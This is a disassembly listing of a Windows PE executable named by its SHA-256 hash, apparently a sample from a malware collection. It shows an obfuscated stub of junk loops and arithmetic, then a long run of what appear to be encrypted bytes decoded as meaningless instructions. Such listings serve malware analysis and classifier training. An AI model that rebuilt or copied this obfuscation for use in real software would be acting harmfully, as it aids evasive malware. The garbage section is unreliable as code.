
e7cb2cc4fde9ec9bb68d4414523f16394f7c7e2dd94ca596aa2d9fa37347c0fa.exe:     file format pei-i386


Disassembly of section .text:

00401000 <.text>:
  401000:	push   ebp
  401001:	mov    ebp,esp
  401003:	sub    esp,0xb4
  401009:	sub    DWORD PTR ds:0x432e87,ecx
  40100f:	mov    eax,DWORD PTR [ebp+0x8]
  401012:	push   ebx
  401013:	add    DWORD PTR ds:0x432e87,edi
  401019:	push   esi
  40101a:	push   edi
  40101b:	mov    DWORD PTR ds:0x432e9b,0x10
  401025:	cmp    DWORD PTR ds:0x432e9b,0x0
  40102c:	je     0x40107b
  401032:	cmp    DWORD PTR ds:0x432e9b,0x3
  401039:	jb     0x40107b
  40103f:	jmp    0x40104f
  401044:	push   0x432000
  401049:	call   DWORD PTR ds:0x43fdcb
  40104f:	cmp    DWORD PTR ds:0x432e9b,0x4
  401056:	jne    0x401069
  40105c:	mov    edi,DWORD PTR ds:0x432e9b
  401062:	dec    edi
  401063:	mov    DWORD PTR ds:0x432e9b,edi
  401069:	mov    edi,DWORD PTR ds:0x432e9b
  40106f:	dec    edi
  401070:	mov    DWORD PTR ds:0x432e9b,edi
  401076:	jmp    0x401025
  40107b:	mov    esi,0x75108af
  401080:	xor    eax,esi
  401082:	mov    DWORD PTR ds:0x432e87,0x16
  40108c:	cmp    DWORD PTR ds:0x432e87,0x0
  401093:	je     0x4010c8
  401099:	cmp    DWORD PTR ds:0x432e87,0x25
  4010a0:	jge    0x4010c8
  4010a6:	jmp    0x4010b6
  4010ab:	push   0x432189
  4010b0:	call   DWORD PTR ds:0x43fdcf
  4010b6:	mov    ecx,DWORD PTR ds:0x432e87
  4010bc:	dec    ecx
  4010bd:	mov    DWORD PTR ds:0x432e87,ecx
  4010c3:	jmp    0x40108c
  4010c8:	mov    edi,0x3272f6
  4010cd:	or     ecx,DWORD PTR ds:0x432ec7
  4010d3:	add    eax,edi
  4010d5:	mov    DWORD PTR [ebp-0x40],eax
  4010d8:	xor    eax,DWORD PTR ds:0x432e5f
  4010de:	mov    eax,ds:0x4321f3
  4010e3:	and    DWORD PTR ds:0x432ea7,0x31f0
  4010ed:	mov    eax,DWORD PTR [eax]
  4010ef:	sub    DWORD PTR ds:0x432e27,0x491
  4010f9:	mov    DWORD PTR [ebp-0x3c],eax
  4010fc:	mov    eax,ds:0x432403
  401101:	and    DWORD PTR ds:0x432e2f,ecx
  401107:	mov    eax,DWORD PTR [eax]
  401109:	mov    DWORD PTR [ebp-0x1c],eax
  40110c:	xor    DWORD PTR ds:0x432ec7,edx
  401112:	mov    DWORD PTR [ebp-0x34],0xf89c87a5
  401119:	and    DWORD PTR ds:0x432eb7,0x0
  401123:	jmp    0x401136
  401128:	xor    eax,eax
  40112a:	xor    eax,DWORD PTR ds:0x432eb7
  401130:	inc    eax
  401131:	mov    ds:0x432eb7,eax
  401136:	cmp    DWORD PTR ds:0x432eb7,0x14
  40113d:	jae    0x401165
  401143:	cmp    DWORD PTR ds:0x432eb7,0x1b
  40114a:	jl     0x401165
  401150:	jmp    0x401160
  401155:	push   0x83c7
  40115a:	call   DWORD PTR ds:0x43fdd3
  401160:	jmp    0x401128
  401165:	mov    eax,DWORD PTR [ebp-0x34]
  401168:	and    ecx,DWORD PTR ds:0x432e2f
  40116e:	xor    eax,esi
  401170:	add    ecx,DWORD PTR ds:0x432ebf
  401176:	add    eax,edi
  401178:	sub    DWORD PTR ds:0x432e8f,0x1eb6
  401182:	mov    DWORD PTR [ebp-0x40],eax
  401185:	mov    eax,ds:0x432373
  40118a:	mov    DWORD PTR [ebp-0x40],eax
  40118d:	mov    DWORD PTR ds:0x432e97,0x16
  401197:	cmp    DWORD PTR ds:0x432e97,0x0
  40119e:	je     0x4011e9
  4011a4:	cmp    DWORD PTR ds:0x432e97,0x6
  4011ab:	jbe    0x4011e9
  4011b1:	jmp    0x4011c1
  4011b6:	push   0x4320f7
  4011bb:	call   DWORD PTR ds:0x43fddb
  4011c1:	cmp    DWORD PTR ds:0x432e97,0x7
  4011c8:	jne    0x4011d9
  4011ce:	mov    eax,ds:0x432e97
  4011d3:	dec    eax
  4011d4:	mov    ds:0x432e97,eax
  4011d9:	mov    eax,ds:0x432e97
  4011de:	dec    eax
  4011df:	mov    ds:0x432e97,eax
  4011e4:	jmp    0x401197
  4011e9:	mov    eax,DWORD PTR [ebp-0x3c]
  4011ec:	sbb    DWORD PTR ds:0x432ea7,0x187d
  4011f6:	mov    DWORD PTR [ebp-0x14],eax
  4011f9:	not    eax
  4011fb:	mov    eax,DWORD PTR [ebp-0x14]
  4011fe:	push   0x4
  401200:	mov    DWORD PTR ds:0x432e83,0x1e
  40120a:	cmp    DWORD PTR ds:0x432e83,0x0
  401211:	je     0x401260
  401217:	cmp    DWORD PTR ds:0x432e83,0x7
  40121e:	jle    0x401260
  401224:	jmp    0x401234
  401229:	push   0x2582
  40122e:	call   DWORD PTR ds:0x43fddf
  401234:	cmp    DWORD PTR ds:0x432e83,0x8
  40123b:	jne    0x40124e
  401241:	mov    ecx,DWORD PTR ds:0x432e83
  401247:	dec    ecx
  401248:	mov    DWORD PTR ds:0x432e83,ecx
  40124e:	mov    ecx,DWORD PTR ds:0x432e83
  401254:	dec    ecx
  401255:	mov    DWORD PTR ds:0x432e83,ecx
  40125b:	jmp    0x40120a
  401260:	pop    ecx
  401261:	sub    ecx,eax
  401263:	sub    eax,0x50fd
  401268:	add    ecx,DWORD PTR [ebp-0x1c]
  40126b:	mov    DWORD PTR [ebp-0x2c],0xf89c85e5
  401272:	mov    DWORD PTR ds:0x432e63,0x13
  40127c:	cmp    DWORD PTR ds:0x432e63,0x0
  401283:	je     0x4012b6
  401289:	cmp    DWORD PTR ds:0x432e63,0x16
  401290:	jb     0x4012b6
  401296:	jmp    0x4012a6
  40129b:	push   0x432000
  4012a0:	call   DWORD PTR ds:0x43fde3
  4012a6:	mov    eax,ds:0x432e63
  4012ab:	dec    eax
  4012ac:	mov    ds:0x432e63,eax
  4012b1:	jmp    0x40127c
  4012b6:	mov    DWORD PTR [ebp-0x18],ecx
  4012b9:	movzx  eax,WORD PTR ds:0x432e73
  4012c0:	sub    DWORD PTR ds:0x432e93,eax
  4012c6:	mov    DWORD PTR [ebp-0xa0],0xf89c85a1
  4012d0:	mov    eax,DWORD PTR [ebp-0x14]
  4012d3:	xor    DWORD PTR ds:0x432ec7,0x432e57
  4012dd:	mov    DWORD PTR [ebp-0x9c],eax
  4012e3:	mov    eax,DWORD PTR [ebp-0x18]
  4012e6:	mov    DWORD PTR [ebp-0x98],eax
  4012ec:	mov    eax,DWORD PTR [ebp-0x2c]
  4012ef:	adc    DWORD PTR ds:0x432ec7,0x7160
  4012f9:	xor    eax,esi
  4012fb:	sbb    DWORD PTR ds:0x432e3b,0x6908
  401305:	add    eax,edi
  401307:	or     DWORD PTR ds:0x432e2b,0x5a5f
  401311:	mov    DWORD PTR [ebp-0x94],eax
  401317:	not    DWORD PTR ds:0x432e47
  40131d:	lea    eax,[ebp-0x48]
  401320:	mov    DWORD PTR [ebp-0x90],eax
  401326:	adc    DWORD PTR ds:0x432ea7,edx
  40132c:	mov    eax,DWORD PTR [ebp-0xa0]
  401332:	or     DWORD PTR ds:0x432e57,0x432e77
  40133c:	xor    eax,esi
  40133e:	or     DWORD PTR ds:0x432e7f,0x24f1
  401348:	add    eax,edi
  40134a:	or     DWORD PTR ds:0x432e73,0x432e63
  401354:	mov    DWORD PTR [ebp-0xa0],eax
  40135a:	adc    DWORD PTR ds:0x432e63,0x432e67
  401364:	lea    eax,[ebp-0xa0]
  40136a:	push   eax
  40136b:	neg    eax
  40136d:	mov    eax,DWORD PTR [ebp+0xc]
  401370:	sub    DWORD PTR ds:0x432ecf,0x432e77
  40137a:	xor    eax,esi
  40137c:	xor    DWORD PTR ds:0x432ecf,0x432e67
  401386:	add    eax,edi
  401388:	sub    DWORD PTR ds:0x432e9f,0x432e77
  401392:	push   eax
  401393:	mov    eax,ds:0x432393
  401398:	add    DWORD PTR ds:0x432e73,0x432eb7
  4013a2:	push   0x4322e9
  4013a7:	or     DWORD PTR ds:0x432e47,0x49f0
  4013b1:	push   DWORD PTR [eax]
  4013b3:	or     DWORD PTR ds:0x432e47,0x432e5b
  4013bd:	call   0x4061d0
  4013c2:	sbb    edx,0x761a
  4013c8:	mov    ebx,DWORD PTR [ebp-0x14]
  4013cb:	adc    eax,edx
  4013cd:	mov    eax,DWORD PTR [ebp-0x18]
  4013d0:	mov    edx,DWORD PTR ds:0x432ec7
  4013d6:	adc    edx,DWORD PTR ds:0x432e37
  4013dc:	mov    DWORD PTR ds:0x432ec7,edx
  4013e2:	mov    DWORD PTR [ebp-0x58],eax
  4013e5:	movzx  eax,WORD PTR ds:0x432e5f
  4013ec:	and    DWORD PTR ds:0x432e23,eax
  4013f2:	mov    DWORD PTR [ebp-0x34],0xf89c853c
  4013f9:	mov    eax,0xf89c85a3
  4013fe:	mov    DWORD PTR [ebp-0x1c],eax
  401401:	sbb    DWORD PTR ds:0x432ec7,0x20b
  40140b:	lea    ecx,[eax+0x2]
  40140e:	sbb    DWORD PTR ds:0x432e87,ebx
  401414:	mov    DWORD PTR [ebp-0x28],ecx
  401417:	mov    DWORD PTR [ebp-0x10],0xf89c85a4
  40141e:	sbb    edx,0x4ac2
  401424:	mov    DWORD PTR [ebp-0x8],eax
  401427:	sbb    DWORD PTR ds:0x432ecb,edx
  40142d:	mov    eax,DWORD PTR [ebp-0x10]
  401430:	and    DWORD PTR ds:0x432eb7,0x0
  40143a:	mov    edx,DWORD PTR ds:0x432eb7
  401440:	inc    edx
  401441:	mov    DWORD PTR ds:0x432eb7,edx
  401447:	cmp    DWORD PTR ds:0x432eb7,0x21
  40144e:	jbe    0x401471
  401454:	jmp    0x401464
  401459:	push   0x73f7
  40145e:	call   DWORD PTR ds:0x43fde7
  401464:	cmp    DWORD PTR ds:0x432eb7,0x19
  40146b:	jb     0x40143a
  401471:	xor    eax,esi
  401473:	mov    edx,0xffcd8d8a
  401478:	add    DWORD PTR ds:0x432ec3,0x432e5b
  401482:	sub    edx,eax
  401484:	mov    DWORD PTR ds:0x432e43,0xef0
  40148e:	mov    DWORD PTR [ebp-0xc],edx
  401491:	not    eax
  401493:	mov    DWORD PTR [ebp-0x18],0xf89c85a0
  40149a:	mov    eax,DWORD PTR [ebp-0x8]
  40149d:	mov    DWORD PTR [ebp-0x3c],ebx
  4014a0:	mov    DWORD PTR ds:0x432e7f,0x7ee3
  4014aa:	cmp    eax,ecx
  4014ac:	mov    DWORD PTR ds:0x432ea7,0x6a4b
  4014b6:	je     0x403bac
  4014bc:	jmp    0x403815
  4014c1:	mov    ebp,0x855ffdc7
  4014c6:	inc    ebp
  4014c7:	popf   
  4014c8:	test   DWORD PTR [eax+0xaa705df],esi
  4014ce:	popa   
  4014cf:	(bad)  
  4014d0:	fild   WORD PTR [ebx+0x47838383]
  4014d6:	pusha  
  4014d7:	add    DWORD PTR [ebx+0x3e28312a],0x26
  4014de:	cmp    ah,BYTE PTR [eax+esi*1]
  4014e1:	jp     0x401562
  4014e3:	jbe    0x40155c
  4014e5:	add    bh,BYTE PTR [edi+0x4b727372]
  4014eb:	(bad)  
  4014ed:	(bad)  
  4014ee:	ins    DWORD PTR es:[edi],dx
  4014ef:	push   ebp
  4014f0:	je     0x401570
  4014f2:	lods   eax,DWORD PTR fs:[esi]
  4014f4:	jge    0x401568
  4014f6:	data16 shl BYTE PTR [edx+0x53],1
  4014fa:	cmp    eax,0x87980391
  4014ff:	push   0x8d488052
  401504:	mov    bh,0x80
  401506:	mov    ebp,0x3144bb
  40150b:	ja     0x4014ee
  40150d:	add    ebp,DWORD PTR [eax+eax*4+0x1f]
  401511:	repnz inc esi
  401513:	rol    bl,cl
  401515:	repnz cwde 
  401517:	sub    al,0xdf
  401519:	xchg   esp,eax
  40151a:	adc    BYTE PTR ss:[esi-0x4c],ah
  40151e:	xchg   ebx,eax
  40151f:	(bad)  [eax]
  401521:	jb     0x401505
  401523:	sbb    ecx,ebp
  401525:	lsl    esi,WORD PTR [edi]
  401528:	and    eax,0x74371155
  40152d:	jne    0x4014f5
  40152f:	mov    al,0x2c
  401531:	pop    esi
  401532:	sbb    dh,BYTE PTR [edi+0x3456f600]
  401538:	mov    DWORD PTR [ebx-0x2b],ecx
  40153b:	fs push es
  40153d:	and    eax,DWORD PTR [ebx]
  40153f:	xchg   ebp,eax
  401540:	imul   ebp,esi,0x2a
  401543:	inc    esi
  401544:	mov    ebx,0x3d1d330c
  401549:	pop    ss
  40154a:	push   esp
  40154b:	adc    dh,dl
  40154d:	add    eax,0xb58afa84
  401552:	clc    
  401553:	and    al,0x93
  401555:	mov    eax,ds:0xb84cce0b
  40155a:	and    DWORD PTR [eax-0x2392636],edi
  401560:	scas   eax,DWORD PTR es:[edi]
  401561:	pop    ss
  401562:	jb     0x4014f8
  401564:	jb     0x40155e
  401566:	inc    edx
  401567:	inc    eax
  401568:	in     al,0x7c
  40156a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40156b:	aas    
  40156c:	(bad)  
  40156d:	mov    edx,0xf9131cff
  401572:	mov    eax,ds:0x3c09af9c
  401577:	xor    al,0xb
  401579:	sub    DWORD PTR [edx+ebp*8],edi
  40157c:	pop    ebp
  40157d:	xchg   esi,eax
  40157e:	push   esi
  40157f:	mov    ebx,0x26a8ae2c
  401584:	inc    edx
  401585:	div    DWORD PTR [esi]
  401587:	mov    ecx,0xbf842c3c
  40158c:	mov    DWORD PTR [ebx+0x76],ebp
  40158f:	or     dh,BYTE PTR [ebx-0x2e]
  401592:	pop    ss
  401593:	stos   DWORD PTR es:[edi],eax
  401594:	cmp    BYTE PTR [edx],0xfa
  401597:	stos   BYTE PTR es:[edi],al
  401598:	xchg   ebp,eax
  401599:	dec    ecx
  40159a:	mov    BYTE PTR [edx-0x1c1ae3bd],bl
  4015a0:	mov    DWORD PTR [esi],ecx
  4015a2:	sub    ch,BYTE PTR ds:0x18e4872b
  4015a8:	jne    0x401609
  4015aa:	push   ds
  4015ab:	clc    
  4015ac:	inc    esp
  4015ad:	jp     0x401581
  4015af:	test   BYTE PTR [eax],cl
  4015b1:	lahf   
  4015b2:	jmp    0x4ab0753e
  4015b7:	ins    DWORD PTR es:[edi],dx
  4015b8:	push   ebx
  4015b9:	mov    dl,0x6e
  4015bb:	sbb    dl,BYTE PTR [edx+0xe]
  4015be:	lea    ebp,[esp+ebp*1+0x0]
  4015c2:	out    0x53,eax
  4015c4:	sub    edx,DWORD PTR [edx-0x36b60b8]
  4015ca:	xlat   BYTE PTR ds:[ebx]
  4015cb:	sbb    ah,al
  4015cd:	lock es mov edx,0x4930e79
  4015d4:	sub    al,0x10
  4015d6:	dec    edx
  4015d7:	aaa    
  4015d8:	push   cs
  4015d9:	xor    BYTE PTR [ebp-0x62],al
  4015dc:	jmp    0xc2de:0x9529
  4015e2:	push   esi
  4015e3:	aaa    
  4015e4:	push   0xffffffeb
  4015e6:	jecxz  0x4015ff
  4015e8:	rcr    BYTE PTR [ecx-0x4f],1
  4015eb:	dec    eax
  4015ec:	and    eax,0xe781c37b
  4015f1:	jmp    0xa66a1727
  4015f6:	call   DWORD PTR [eax-0xc80e8e6]
  4015fc:	outs   dx,DWORD PTR ds:[esi]
  4015fd:	inc    edx
  4015fe:	mov    dh,0x5b
  401600:	aas    
  401601:	fsub   QWORD PTR [edi+0x25]
  401604:	ja     0x401666
  401606:	xor    BYTE PTR [ecx],0xf0
  401609:	clc    
  40160a:	adc    DWORD PTR [esi],edi
  40160c:	(bad)  
  40160d:	mov    DWORD PTR ds:[edx-0x79e22b9d],eax
  401614:	adc    eax,0x814394ee
  401619:	jmp    0xd0ae:0x8a88c97b
  401620:	jo     0x401657
  401622:	xlat   BYTE PTR ds:[ebx]
  401623:	clc    
  401624:	cmp    esi,esi
  401626:	push   eax
  401627:	or     eax,0x8730e287
  40162c:	mov    ebp,0x300efb8d
  401631:	sbb    ebp,DWORD PTR [edx-0x54]
  401634:	inc    ecx
  401635:	loope  0x4016b3
  401637:	cmp    eax,0xad574004
  40163c:	sbb    DWORD PTR [edx],edi
  40163e:	inc    eax
  40163f:	jge    0x4016b1
  401641:	mov    ecx,DWORD PTR [edx+0x17c2a68f]
  401647:	jmp    0xb6eb:0x1d05ba96
  40164e:	pop    ebp
  40164f:	xchg   ebp,eax
  401650:	inc    esi
  401651:	out    0x37,eax
  401653:	add    BYTE PTR [ebx+0x51484b22],0xbc
  40165a:	inc    esp
  40165b:	sub    BYTE PTR [edi+0x6b],al
  40165e:	push   ebp
  40165f:	mov    edx,0xd822cd6f
  401664:	addr16 inc eax
  401666:	adc    ah,BYTE PTR [ebx-0x5a5386ee]
  40166c:	stos   DWORD PTR es:[edi],eax
  40166d:	and    ecx,DWORD PTR [ecx+0x465a0149]
  401673:	loope  0x4016c2
  401675:	cmp    eax,0x38186d19
  40167a:	mov    ds:0xf30b41f1,eax
  40167f:	inc    esp
  401680:	out    dx,al
  401681:	mov    ch,BYTE PTR [edi+0x7bb8d9e2]
  401687:	in     al,dx
  401688:	push   ecx
  401689:	call   0x5f5697ac
  40168e:	ins    BYTE PTR es:[edi],dx
  40168f:	inc    esi
  401690:	mov    ah,0x84
  401692:	das    
  401693:	jae    0x4016cb
  401695:	int    0x63
  401697:	mov    bh,0x57
  401699:	mov    edi,0x5da3b1ef
  40169e:	jbe    0x4016ca
  4016a0:	popa   
  4016a1:	jge    0x401638
  4016a3:	(bad)  
  4016a4:	fs mov al,0xad
  4016a7:	ret    0xb51d
  4016aa:	dec    edi
  4016ab:	and    edx,DWORD PTR [edx+0x36889400]
  4016b1:	pop    ecx
  4016b2:	(bad)  
  4016b3:	cmc    
  4016b4:	arpl   di,cx
  4016b6:	xor    DWORD PTR [edi+ebp*4-0x14],0xc4e99827
  4016be:	les    ecx,FWORD PTR [esp+ebx*4-0x225d25c0]
  4016c5:	jmp    ebx
  4016c7:	es jp  0x4016c0
  4016ca:	mov    ecx,0x88ceafa4
  4016cf:	mov    edx,esp
  4016d1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4016d2:	xchg   BYTE PTR [esi+0x6d3b5b4d],bl
  4016d8:	rol    DWORD PTR [esi+esi*1-0x6c],1
  4016dc:	out    dx,al
  4016dd:	stos   BYTE PTR es:[edi],al
  4016de:	sbb    ecx,eax
  4016e0:	fild   DWORD PTR [ebx]
  4016e2:	sbb    BYTE PTR [esi],ah
  4016e4:	sbb    DWORD PTR [esi+edi*4-0x6816574b],esi
  4016eb:	sub    DWORD PTR [eax+0x33],0xbcbd6d5d
  4016f2:	sbb    ebx,DWORD PTR [ecx]
  4016f4:	shl    al,0x44
  4016f7:	popa   
  4016f8:	dec    esp
  4016f9:	pop    es
  4016fa:	xchg   ebx,eax
  4016fb:	test   BYTE PTR [ebx+edi*8+0x7520aa1d],0x6a
  401703:	arpl   WORD PTR [edx+esi*2],si
  401706:	aaa    
  401707:	sub    ecx,ebx
  401709:	loop   0x4016ce
  40170b:	ins    BYTE PTR es:[edi],dx
  40170c:	add    BYTE PTR [ebx+ebp*4+0x53],dh
  401710:	fdiv   QWORD PTR [edx+eax*1-0x48739c7e]
  401717:	sub    dh,al
  401719:	sub    edi,edi
  40171b:	mov    ds:0xddcba169,al
  401720:	popf   
  401721:	push   edi
  401722:	mov    bl,0x84
  401724:	out    0xb6,eax
  401726:	pop    esi
  401727:	cmp    eax,0x7ccf4edf
  40172c:	cdq    
  40172d:	sub    esp,edx
  40172f:	inc    eax
  401730:	inc    edx
  401731:	fisttp WORD PTR [edi]
  401733:	stos   DWORD PTR es:[edi],eax
  401734:	lock dec esi
  401736:	adc    eax,0x30053d0
  40173b:	int3   
  40173c:	lahf   
  40173d:	xabort 0xdf
  401740:	imul   eax,edi,0x2245975b
  401746:	sub    bh,BYTE PTR [ebp+ecx*2-0x19ac5adb]
  40174d:	call   0x57d5:0xf1c834f5
  401754:	xor    al,0xb4
  401756:	and    ebx,DWORD PTR [ecx]
  401758:	iret   
  401759:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40175a:	mov    al,0x81
  40175c:	dec    BYTE PTR [edi]
  40175e:	jmp    0x401743
  401760:	rcr    al,1
  401762:	jo     0x4016f9
  401764:	jne    0x40173b
  401766:	inc    ecx
  401767:	iret   
  401768:	jmp    0x401792
  40176a:	cmp    ch,BYTE PTR [edi-0x47]
  40176d:	(bad)  
  40176e:	and    BYTE PTR es:[edx+eiz*8-0x9f4c243],al
  401776:	xor    bl,BYTE PTR [eax-0x505953ef]
  40177c:	bound  esi,QWORD PTR [ebx]
  40177e:	ror    DWORD PTR [ebx],0x7c
  401781:	push   edx
  401782:	cmc    
  401783:	ss jl  0x4017f6
  401786:	or     bh,BYTE PTR [eax+0x77f23841]
  40178c:	jmp    0x401751
  40178e:	adc    dh,0x17
  401791:	dec    edi
  401792:	mov    eax,0xa5def486
  401797:	dec    eax
  401798:	ret    
  401799:	lods   al,BYTE PTR ds:[esi]
  40179a:	adc    BYTE PTR [ebx+0x7af77326],bh
  4017a0:	addr16 push ebp
  4017a2:	adc    DWORD PTR [ebx-0x18],edi
  4017a5:	sub    edi,esp
  4017a7:	and    ecx,DWORD PTR [ebp-0x29]
  4017aa:	push   esi
  4017ab:	push   ss
  4017ac:	fbld   TBYTE PTR [edi+0x51]
  4017af:	int3   
  4017b0:	iret   
  4017b1:	jno    0x4017ee
  4017b3:	aad    0x17
  4017b5:	fdiv   DWORD PTR [ecx+0x5e]
  4017b8:	cmc    
  4017b9:	in     al,dx
  4017ba:	pusha  
  4017bb:	stos   DWORD PTR es:[edi],eax
  4017bc:	iret   
  4017bd:	push   edi
  4017be:	mov    eax,0x99ed1210
  4017c3:	mov    ah,0x4
  4017c5:	jno    0x40182f
  4017c7:	test   eax,0x2d3a385a
  4017cc:	mov    DWORD PTR [ebx],0x54041595
  4017d2:	dec    edi
  4017d3:	or     ch,BYTE PTR [esi]
  4017d5:	fcom   DWORD PTR ds:0x927beada
  4017db:	aas    
  4017dc:	mov    ebp,0xc57305b0
  4017e1:	retf   0x2362
  4017e4:	push   esi
  4017e5:	daa    
  4017e6:	sbb    BYTE PTR [ebp+0x2823c3d5],dl
  4017ec:	call   0x8c7b:0x322eac1
  4017f3:	loopne 0x40185a
  4017f5:	push   ss
  4017f6:	dec    esi
  4017f7:	in     al,0x6f
  4017f9:	jb     0x401870
  4017fb:	iret   
  4017fc:	rcr    DWORD PTR [ebx],cl
  4017fe:	mov    eax,ds:0x6b92e9a1
  401803:	repz inc ecx
  401805:	sub    dl,BYTE PTR [esi]
  401807:	mov    al,0xf2
  401809:	(bad)  
  40180a:	ins    BYTE PTR es:[edi],dx
  40180b:	mov    al,ds:0xa9f885c4
  401810:	pop    edx
  401811:	jl     0x4017dc
  401813:	push   esi
  401814:	enter  0xc38b,0x75
  401818:	cmp    eax,0x1349ff3d
  40181d:	fstp   QWORD PTR [ecx+ecx*4-0x506636ea]
  401824:	mov    gs,WORD PTR [edx]
  401826:	ret    0xf851
  401829:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40182a:	dec    ebp
  40182b:	jb     0x401870
  40182d:	jmp    FWORD PTR [eax+0x870d509]
  401833:	(bad)  [ebx-0x76]
  401836:	and    DWORD PTR [ecx+0x567e1cd7],edi
  40183c:	pop    ss
  40183d:	mov    ebp,0x2e2e318e
  401842:	clc    
  401843:	mov    ds:0x96040622,al
  401848:	jg     0x40183f
  40184a:	mov    esp,DWORD PTR [ebp-0x1f882440]
  401850:	ss jno 0x401891
  401853:	and    ecx,DWORD PTR [edx+ebx*1]
  401856:	call   0xcab797b5
  40185b:	cmp    ch,BYTE PTR [eax+edi*1]
  40185e:	ror    BYTE PTR [edi-0x37b3bb11],0xa4
  401865:	pop    edx
  401866:	int3   
  401867:	out    0xf7,eax
  401869:	mov    BYTE PTR ss:[esp+edi*4+0x3680b3b4],al
  401871:	faddp  st(2),st
  401873:	icebp  
  401874:	or     BYTE PTR [ebx-0x595a1d52],cl
  40187a:	jb     0x401897
  40187c:	mov    eax,0xcad1f679
  401881:	repnz sbb ebx,esp
  401884:	js     0x401861
  401886:	jno    0x4018bd
  401888:	imul   esp,edx,0x1d9b2f08
  40188e:	and    edi,DWORD PTR [eax]
  401890:	das    
  401891:	ja     0x401843
  401893:	mov    WORD PTR [edx+edi*2],?
  401896:	jg     0x40181f
  401898:	pop    es
  401899:	ins    BYTE PTR es:[edi],dx
  40189a:	sub    al,0xb6
  40189c:	and    DWORD PTR [ecx-0x6d],ebx
  40189f:	shl    esi,cl
  4018a1:	sbb    dl,BYTE PTR [edx]
  4018a3:	and    eax,0xd399c734
  4018a8:	lods   al,BYTE PTR ds:[esi]
  4018a9:	ja     0x401847
  4018ab:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4018ac:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4018ad:	hlt    
  4018ae:	dec    esi
  4018af:	mov    ah,0xed
  4018b1:	imul   ebx,edx,0x2e
  4018b4:	lods   al,BYTE PTR ds:[esi]
  4018b5:	dec    ecx
  4018b6:	xor    al,0x2c
  4018b8:	mov    esi,0x9b555149
  4018bd:	inc    esi
  4018be:	fild   DWORD PTR [edx-0x69cbf044]
  4018c4:	mov    cl,0x22
  4018c6:	fsubr  DWORD PTR [eax+0x55]
  4018c9:	mov    al,0xc6
  4018cb:	pop    eax
  4018cc:	jg     0x4018e5
  4018ce:	xor    DWORD PTR [eax+0x56],ebp
  4018d1:	cmovb  ebx,DWORD PTR [ecx+0x7197d37a]
  4018d8:	push   ebx
  4018d9:	mov    ecx,0xc7223818
  4018de:	sub    DWORD PTR [edx-0x26],0xfffffffb
  4018e2:	lea    esi,[ecx+0x29]
  4018e5:	push   ecx
  4018e6:	outs   dx,DWORD PTR ds:[esi]
  4018e7:	sbb    DWORD PTR [eax+0x432c9d33],esi
  4018ed:	mov    ebx,0x297073aa
  4018f2:	sub    edi,DWORD PTR [edx+0x2d]
  4018f5:	(bad)
  4018f8:	push   edi
  4018f9:	pop    ebx
  4018fa:	loop   0x4018cf
  4018fc:	mov    ds,ebx
  4018fe:	mov    ebx,DWORD PTR [esi-0x3b]
  401901:	out    0xb8,al
  401903:	repz mov bh,0x1b
  401906:	and    bl,BYTE PTR [ebp+ebp*4-0x17d331cc]
  40190d:	mov    ds:0xc748fb14,al
  401912:	(bad)
  401915:	mov    cl,0x97
  401917:	les    esp,FWORD PTR ds:0x1a56fc10
  40191d:	xchg   esi,eax
  40191e:	adc    eax,0x54d5da2f
  401923:	jne    0x401959
  401925:	es icebp 
  401927:	hlt    
  401928:	sbb    ah,0x3
  40192b:	pop    edi
  40192c:	test   BYTE PTR [edi+0x6604d908],ch
  401932:	mov    edi,0xb264a24b
  401937:	in     eax,0x21
  401939:	push   eax
  40193a:	inc    eax
  40193b:	xchg   edi,eax
  40193c:	xchg   esp,eax
  40193d:	sbb    eax,0x6e1a061a
  401942:	mov    edi,0x979bde13
  401947:	add    eax,DWORD PTR ds:0xbeb4e906
  40194d:	repnz and BYTE PTR [ecx+0x7b4fc043],bh
  401954:	sar    DWORD PTR [ebp-0x6d67c1c7],1
  40195a:	jp     0x401941
  40195c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40195d:	sub    eax,0x67a32457
  401962:	inc    ecx
  401963:	lods   eax,DWORD PTR ds:[esi]
  401964:	subps  xmm6,XMMWORD PTR [ecx]
  401967:	mov    edx,0x49634427
  40196c:	retf   0x81b5
  40196f:	std    
  401970:	cwde   
  401971:	outs   dx,DWORD PTR ds:[esi]
  401972:	xor    DWORD PTR [edx+0x61950c18],esp
  401978:	ds cmova ecx,ebp
  40197c:	iret   
  40197d:	adc    BYTE PTR [ecx],bl
  40197f:	jecxz  0x401979
  401981:	popf   
  401982:	xor    al,0x91
  401984:	dec    eax
  401985:	cmp    al,0x4f
  401987:	scas   al,BYTE PTR es:[edi]
  401988:	inc    esi
  401989:	(bad)  
  40198a:	aas    
  40198b:	sub    eax,0x19e318fb
  401990:	int    0xb8
  401992:	mov    bl,0x38
  401994:	ins    DWORD PTR es:[edi],dx
  401995:	mov    edi,0x84b44fb6
  40199a:	sbb    BYTE PTR ds:0x349eb106,cl
  4019a0:	jnp    0x4019ea
  4019a2:	push   es
  4019a3:	sub    ax,0x3253
  4019a7:	ror    DWORD PTR [ebp+0x6171c2b6],1
  4019ad:	outs   dx,DWORD PTR ds:[esi]
  4019ae:	icebp  
  4019af:	or     bl,cl
  4019b1:	mov    esi,0x64763c82
  4019b6:	push   esi
  4019b7:	es pushf 
  4019b9:	mov    BYTE PTR ds:0x899d9478,dl
  4019bf:	or     DWORD PTR [ebx-0x82c6f01],0x9
  4019c6:	pop    eax
  4019c7:	das    
  4019c8:	push   ss
  4019c9:	mov    dl,0x31
  4019cb:	inc    ebp
  4019cc:	stos   BYTE PTR es:[edi],al
  4019cd:	and    BYTE PTR [esi],dl
  4019cf:	push   esi
  4019d0:	sub    al,0xbb
  4019d2:	retf   0x4427
  4019d5:	xor    ah,BYTE PTR [ecx-0x592d0967]
  4019db:	pop    ebp
  4019dc:	mov    eax,ds:0x56a55cec
  4019e1:	lods   al,BYTE PTR ds:[esi]
  4019e2:	jmp    0x5077ed10
  4019e7:	int    0xb
  4019e9:	call   0x4ad2:0xa1a857d1
  4019f0:	inc    esp
  4019f1:	out    0xd1,al
  4019f3:	stos   DWORD PTR es:[edi],eax
  4019f4:	test   ah,dh
  4019f6:	or     edx,DWORD PTR [esi-0x6cbba146]
  4019fc:	push   0x4947098b
  401a01:	push   cs
  401a02:	retf   
  401a03:	iret   
